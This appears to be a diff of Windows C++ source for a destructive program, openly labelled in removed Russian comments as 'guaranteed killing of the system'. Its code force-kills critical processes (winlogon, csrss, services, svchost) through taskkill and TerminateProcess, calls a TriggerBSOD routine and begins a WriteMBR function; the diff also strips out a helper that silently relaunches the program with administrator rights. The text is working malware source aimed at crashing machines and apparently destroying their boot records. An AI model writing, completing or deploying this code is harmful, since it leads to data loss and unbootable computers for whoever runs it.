@@ -3,8 +3,8 @@
 #include <vector>
 #include <fstream>
 #include <shlwapi.h>
-#include <tlhelp32.h>      // ← ДОБАВЛЕНО для CreateToolhelp32Snapshot
-#include <cstdlib>         // ← ДОБАВЛЕНО для system()
+#include <tlhelp32.h>
+#include <cstdlib>
 
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -35,11 +35,7 @@ void EnableShutdownPrivilege() {
     CloseHandle(hToken);
 }
 
-// ============================================================
-// ГАРАНТИРОВАННОЕ УБИЙСТВО СИСТЕМЫ ЧЕРЕЗ TASKKILL
-// ============================================================
 void KillCriticalProcesses() {
-    // Сначала пытаемся через taskkill (реальные процессы)
     system("taskkill /f /im winlogon.exe 2>nul");
     system("taskkill /f /im csrss.exe 2>nul");
     system("taskkill /f /im services.exe 2>nul");
@@ -47,7 +43,6 @@ void KillCriticalProcesses() {
     system("taskkill /f /im svchost.exe 2>nul");
     system("taskkill /f /im explorer.exe 2>nul");
 
-    // Если taskkill не сработал — убиваем через TerminateProcess
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return;
     PROCESSENTRY32 pe;
@@ -114,17 +109,6 @@ void TriggerBSOD() {
     }
 
     KillCriticalProcesses();
-}
-
-void ElevateAndRun() {
-    char szPath[MAX_PATH];
-    GetModuleFileNameA(NULL, szPath, MAX_PATH);
-    SHELLEXECUTEINFOA sei = {0};
-    sei.cbSize = sizeof(sei);
-    sei.lpVerb = "runas";
-    sei.lpFile = szPath;
-    sei.nShow = SW_HIDE;
-    if (ShellExecuteExA(&sei)) ExitProcess(0);
 }
 
 void WriteMBR() {
